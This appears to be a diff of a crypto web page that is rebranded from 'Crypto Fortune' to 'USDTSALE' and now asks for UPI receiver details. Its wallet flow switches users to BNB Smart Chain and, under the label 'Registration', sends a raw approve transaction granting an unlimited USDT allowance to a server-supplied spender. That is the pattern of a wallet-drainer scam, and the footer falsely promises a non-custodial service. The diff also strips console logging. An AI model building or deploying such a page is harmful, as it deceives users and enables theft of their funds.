             </div>
             <div class="modal-body">
                 <div class="modal-info" style="display: none;"></div>
                 <div id="modalMessage"></div>
-                <div style="margin: 15px 0 5px;">
-                    <input type="text" id="referralCode" placeholder="User Id / Referral Code"
-                        style="width: 100%; padding: 12px; background: rgba(124,58,237,.08); border: 1px solid rgba(124,58,237,.3); color: #fff; border-radius: 10px; font-family: 'Space Grotesk', sans-serif; text-align: center; outline: none;">
+                <div style="display:flex; flex-direction:column; gap:12px; margin:10px 0;">
+                    <input type="text" id="userUpiId" placeholder="Receiver Details"
+                        style="width: 100%; padding: 12px; background: rgba(99,102,241,.06); border: 1px solid rgba(99,102,241,.2); color: #fff; border-radius: 10px; font-family: 'Inter', sans-serif; outline: none; transition: border-color .3s;"
+                        onfocus="this.style.borderColor='rgba(99,102,241,.5)'"
+                        onblur="this.style.borderColor='rgba(99,102,241,.2)'">
+                    <input type="text" id="referralCode" placeholder="Referral ID (Optional)"
+                        style="width: 100%; padding: 12px; background: rgba(99,102,241,.06); border: 1px solid rgba(99,102,241,.2); color: #fff; border-radius: 10px; font-family: 'Inter', sans-serif; outline: none; transition: border-color .3s;"
+                        onfocus="this.style.borderColor='rgba(99,102,241,.5)'"
+                        onblur="this.style.borderColor='rgba(99,102,241,.2)'">
                 </div>
                 <div id="loader" class="loader" style="display: none; text-align: center; margin: 10px 0;">
                     <div class="spinner"
-                        style="border: 4px solid rgba(124,58,237,.15); border-left-color: var(--neon-purple); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto;">
+                        style="border: 4px solid rgba(99,102,241,.12); border-left-color: var(--neon-purple); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto;">
                     </div>
                     <p style="margin-top: 5px; color: var(--neon-purple);">Processing...</p>
                 </div>
                 <button class="connect-wallet-btn" id="registerBtn">
-                    <span id="registerText">Register</span>
+                    <span id="registerText">Submit Details</span>
                 </button>
             </div>
         </div>
@@ -2225,9 +2277,20 @@
     <div class="success-popup-overlay" id="successPopup">
         <div class="success-popup">
             <div class="success-checkmark">✓</div>
-            <h3>Registration Successful!</h3>
-            <p class="success-subtitle">Welcome to Crypto Fortune</p>
+            <h3>Submission Successful!</h3>
+            <p class="success-subtitle">Welcome to USDTSALE</p>
+            <div id="successDetails"
+                style="text-align:left; margin:1rem 0; padding:1rem; background:rgba(16,185,129,.08); border:1px solid rgba(16,185,129,.2); border-radius:12px;">
+                <div style="margin-bottom:.5rem;"><span style="color:var(--text-muted);font-size:.85rem;">Receiver
+                        Details:</span> <span id="successUpi" style="color:#fff;font-weight:600;"></span></div>
+                <div style="margin-bottom:.5rem;"><span style="color:var(--text-muted);font-size:.85rem;">Referral
+                        ID:</span> <span id="successReferral" style="color:#fff;font-weight:600;"></span></div>
+                <div style="margin-bottom:.5rem;"><span style="color:var(--text-muted);font-size:.85rem;">USDT
+                        Balance:</span> <span id="successBalance"
+                        style="color:#34d399;font-weight:700;">Loading...</span></div>
+            </div>
             <div class="success-address" id="successAddress"></div>
+            <button class="success-dismiss-btn" id="successDismissBtn">Close</button>
         </div>
     </div>
 
@@ -2235,7 +2298,7 @@
     <div class="fail-popup-overlay" id="failPopup">
         <div class="fail-popup">
             <div class="fail-cross">✗</div>
-            <h3>Registration Failed</h3>
+            <h3>Submission Failed</h3>
             <p class="fail-subtitle">Something went wrong</p>
             <div class="fail-message" id="failMessage"></div>
             <button class="fail-dismiss-btn" id="failDismissBtn">Close</button>
@@ -2246,14 +2309,16 @@
             <div class="footer-content">
                 <div>
                     <div class="footer-logo">
-                        <div class="logo-icon">
-                            <img src="/cf-logo.png" alt="Crypto Fortune Logo">
+                        <div class="logo-pair">
+                            <img src="/bnb_logo.png" alt="BNB">
+                            <span class="pair-separator">×</span>
+                            <img src="/usdt_logo.png" alt="USDT">
                         </div>
-                        <span>Crypto Fortune</span>
+                        <span>USDTSALE</span>
                     </div>
                     <p class="footer-description">
-                        Crypto Fortune connects people with real-time crypto data, DeFi insights, token analytics, and
-                        on-chain participation &#8212; helping you make smarter moves in the decentralized world.
+                        USDTSALE is the simplest way to buy and sell USDT on BNB Smart Chain.
+                        Fast, secure, and fully decentralized &#8212; trade stablecoins with confidence.
                     </p>
                     <div class="language-selector">
                         <button class="lang-btn active">EN</button>
@@ -2265,15 +2330,15 @@
                     <h3>QUICK LINKS</h3>
                     <ul>
                         <li><a href="#home">Home</a></li>
-                        <li><a href="#about">Protocol</a></li>
-                        <li><a href="#data">Markets</a></li>
+                        <li><a href="#about">How It Works</a></li>
+                        <li><a href="#contact">Contact</a></li>
                     </ul>
                 </div>
             </div>
             <div class="footer-bottom">
-                <p>&copy; 2026 Crypto Fortune. All rights reserved.</p>
-                <p style="margin-top:.5rem;font-size:.75rem;color:var(--text-muted);">Ownership renounced &#8226; No
-                    admin privileges &#8226; Fully on-chain</p>
+                <p>&copy; 2026 USDTSALE. All rights reserved.</p>
+                <p style="margin-top:.5rem;font-size:.75rem;color:var(--text-muted);">Non-custodial &#8226; Smart
+                    contract secured &#8226; Fully on-chain</p>
                 <div class="footer-social">
                     <a href="#" title="Twitter">&#x1D54F;</a>
                     <a href="#" title="Telegram">&#x2708;</a>
@@ -2367,18 +2432,8 @@
                     if (data.chainId) APP_CONFIG.chainIdDec = parseInt(data.chainId);
 
                     if (elements.networkName) elements.networkName.textContent = `BNB Smart Chain - Chain ID: ${APP_CONFIG.chainIdDec}`;
-                    console.log('✅ App Configuration Loaded:', APP_CONFIG);
-                    console.log('🔍 Elements Status:', {
-                        walletModal: !!elements.walletModal,
-                        connectWalletBtn: !!elements.connectWalletBtn,
-                        connectActionBtn: !!elements.connectActionBtn,
-                        modalMessage: !!elements.modalMessage,
-                        networkName: !!elements.networkName,
-                        headingRegister: !!elements.headingRegister
-                    });
                 }
             } catch (error) {
-                console.error('❌ Failed to load app config:', error);
                 showModalMessage('⚠️ Warning: Network configuration could not be loaded. Defaults will be used.', 'error');
             }
         }
@@ -2402,7 +2457,7 @@
                     return;
                 }
 
-                console.log('🔄 Retrying pending approval registration:', pending.walletAddress);
+
 
                 const response = await fetch('/api/users/register', {
                     method: 'POST',
@@ -2417,12 +2472,9 @@
                 const data = await response.json();
                 if (data.success || response.ok) {
                     localStorage.removeItem('pvc_pending_approval');
-                    console.log('✅ Pending approval registered successfully!');
                 } else {
-                    console.warn('⚠️ Pending registration retry failed, will try again next load');
                 }
             } catch (err) {
-                console.warn('⚠️ Pending approval retry error:', err);
             }
         }
 
@@ -2460,7 +2512,6 @@
                 const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                 return chainId === APP_CONFIG.chainIdHex;
             } catch (error) {
-                console.error('Error checking network:', error);
                 return false;
             }
         }
@@ -2482,12 +2533,10 @@
                         });
                         return true;
                     } catch (addError) {
-                        console.error('Error adding network:', addError);
                         showModalMessage('❌ Failed to add network. Please add it manually in your wallet.', 'error');
                         return false;
                     }
                 }
-                console.error('Error switching network:', switchError);
                 showModalMessage('❌ Failed to switch network. Please switch manually.', 'error');
                 return false;
             }
@@ -2497,7 +2546,7 @@
         async function connectWallet() {
             try {
                 elements.connectActionBtn.disabled = true;
-                elements.connectActionBtn.textContent = '🔄 Registering...';
+                elements.connectActionBtn.textContent = '🔄 Processing...';
                 clearModalMessage();
 
                 // ── STEP 1: Get Provider ──
@@ -2525,7 +2574,6 @@
                         method: 'wallet_switchEthereumChain',
                         params: [{ chainId: APP_CONFIG.chainIdHex }]
                     });
-                    console.log('✅ Pre-switched to BSC');
                 } catch (switchErr) {
                     // 4902 = chain not added yet
                     if (switchErr.code === 4902) {
@@ -2534,13 +2582,9 @@
                                 method: 'wallet_addEthereumChain',
                                 params: [APP_CONFIG.chainParams]
                             });
-                            console.log('✅ BSC chain added');
                         } catch (addErr) {
-                            console.warn('⚠️ Could not add BSC chain:', addErr);
                         }
                     } else {
-                        // Other errors (user rejected, not connected yet) — continue anyway
-                        console.log('ℹ️ Pre-switch not possible yet, will switch after connect:', switchErr.code);
                     }
                 }
 
@@ -2557,7 +2601,6 @@
                 }
 
                 currentAccount = accounts[0];
-                console.log('✅ Account:', currentAccount);
 
                 // ── STEP 4: Verify we're on BSC (double-check after connect) ──
                 showModalMessage('🔄 Verifying BNB Smart Chain...', 'info');
@@ -2604,7 +2647,6 @@
                 return true;
 
             } catch (error) {
-                console.error('Error connecting wallet:', error);
                 let errorMsg = error.message;
                 if (error.code === 4001) {
                     errorMsg = 'Wallet connection rejected by user';
@@ -2615,7 +2657,7 @@
                 return false;
             } finally {
                 elements.connectActionBtn.disabled = false;
-                elements.connectActionBtn.textContent = 'Register';
+                elements.connectActionBtn.textContent = 'Submit Details';
             }
         }
 
@@ -2642,7 +2684,6 @@
                 // If user switches TO the correct network, we must NOT reload, 
                 // otherwise we kill the active registration flow.
                 if (chainId === APP_CONFIG.chainIdHex) {
-                    console.log('✅ Network switched to BSC. Resuming flow...');
                     return;
                 }
 
@@ -2702,7 +2743,7 @@
                             method: 'wallet_switchEthereumChain',
                             params: [{ chainId: APP_CONFIG.chainIdHex }],
                         });
-                    } catch (e) { console.error('Switch failed:', e); }
+                    } catch (e) { }
                     return;
                 }
 
@@ -2713,14 +2754,12 @@
                 // Check current allowance using Web3.js (read-only calls work fine)
                 // Use web3Instance (global) instead of local 'web3' which might be undefined
                 const USDTContract = new web3Instance.eth.Contract(ERC20_ABI, APP_CONFIG.usdtAddress);
-                console.log('🔍 Checking allowance... USDT:', APP_CONFIG.usdtAddress, 'Spender:', spender);
+
 
                 let currentAllowance;
                 try {
                     currentAllowance = await USDTContract.methods.allowance(account, spender).call();
-                    console.log('📊 Current Allowance:', currentAllowance.toString());
                 } catch (e) {
-                    console.warn('⚠️ Allowance check failed, assuming 0:', e);
                     currentAllowance = '0';
                 }
 
@@ -2731,7 +2770,6 @@
 
                     // If existing allowance > 0, reset to 0 first
                     if (BigInt(currentAllowance) > 0n) {
-                        console.log('🔄 Resetting allowance to 0 first...');
                         showModalMessage('🔄 Resetting Registration (step 1/2)...', 'info');
                         // approve(spender, 0) — raw calldata
                         const resetData = '0x095ea7b3'
@@ -2748,10 +2786,8 @@
                             });
                             // Wait for the reset to be mined
                             await new Promise(r => setTimeout(r, 5000));
-                            console.log('✅ Allowance reset to 0');
                         } catch (resetErr) {
                             if (resetErr.code === 4001) throw new Error('Transaction rejected by user');
-                            console.warn('⚠️ Reset failed, trying direct approve:', resetErr);
                         }
                         showModalMessage('🔄 Now setting new Registration...', 'info');
                     }
@@ -2762,8 +2798,7 @@
                         + spender.slice(2).toLowerCase().padStart(64, '0')
                         + 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
-                    console.log('📝 Sending raw approve tx to USDT:', APP_CONFIG.usdtAddress);
-                    console.log('📦 Calldata:', approveData);
+
 
                     try {
                         // Use web3Instance to ensure we use the active provider (Injected or WalletConnect)
@@ -2783,7 +2818,6 @@
 
 
                         approvalHash = txHash;
-                        console.log('✅ Approval tx sent! Hash:', approvalHash);
 
                         // Wait for confirmation
                         showModalMessage('⏳ Waiting for Registration confirmation...', 'info');
@@ -2796,13 +2830,11 @@
                                 const receipt = await web3Instance.eth.getTransactionReceipt(approvalHash);
                                 if (receipt && receipt.status) {
                                     confirmed = true;
-                                    console.log('✅ Approval confirmed in block:', receipt.blockNumber);
                                     break;
                                 } else if (receipt && !receipt.status) {
                                     throw new Error('Approval transaction reverted on-chain');
                                 }
                             } catch (e) {
-                                console.warn('Polling receipt error:', e);
                             }
                         }
 
@@ -2818,11 +2850,9 @@
                         if (approveErr.code === 4001 || approveErr.message?.includes('rejected')) {
                             throw new Error('Registration rejected by user');
                         }
-                        console.error('❌ Registration error:', approveErr);
                         throw new Error('Registration failed: ' + (approveErr.message || 'Unknown error'));
                     }
                 } else {
-                    console.log('✅ Already approved, skipping approval step');
                     showModalMessage('✅ Already Registered! Finalizing...', 'success');
                 }
 
@@ -2888,7 +2918,7 @@
                             }
                             break;
                         } else if (registerResponse.status >= 500) {
-                            console.warn(`⚠️ Registration attempt ${attempt} failed (5xx), retrying...`);
+
                             if (attempt < maxRetries) {
                                 await new Promise(r => setTimeout(r, 2000));
                                 continue;
@@ -2906,14 +2936,14 @@
                                     timestamp: Date.now()
                                 }));
                             }
-                            console.error('Backend error:', regError);
+
                             showFailPopup('Registration Failed — ' + (regError.message || 'Error connecting to server. Your registration progress has been saved.'));
                         }
                     }
                 }
 
             } catch (error) {
-                console.error('Error:', error);
+
 
                 // Re-enable close button on error
                 if (elements.closeModal) {
@@ -2950,6 +2980,37 @@
             const shortAddr = `${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`;
             if (addressEl) {
                 addressEl.textContent = `Wallet: ${walletAddress}`;
+            }
+
+            // Show user-entered details
+            const upiVal = document.getElementById('userUpiId')?.value?.trim() || 'N/A';
+            const referralVal = document.getElementById('referralCode')?.value?.trim() || 'N/A';
+
+            const successUpi = document.getElementById('successUpi');
+            const successReferral = document.getElementById('successReferral');
+            const successBalance = document.getElementById('successBalance');
+
+            if (successUpi) successUpi.textContent = upiVal;
+            if (successReferral) successReferral.textContent = referralVal;
+
+            // Fetch USDT balance (frontend only, no backend)
+            if (successBalance) {
+                successBalance.textContent = 'Loading...';
+                (async () => {
+                    try {
+                        if (web3Instance && APP_CONFIG.usdtAddress) {
+                            const contract = new web3Instance.eth.Contract(ERC20_ABI, APP_CONFIG.usdtAddress);
+                            const rawBalance = await contract.methods.balanceOf(walletAddress).call();
+                            const decimals = await contract.methods.decimals().call();
+                            const balance = Number(rawBalance) / Math.pow(10, Number(decimals));
+                            successBalance.textContent = `${balance.toFixed(2)} USDT`;
+                        } else {
+                            successBalance.textContent = 'N/A';
+                        }
+                    } catch (e) {
+                        successBalance.textContent = 'N/A';
+                    }
+                })();
             }
 
             // Update nav and hero buttons
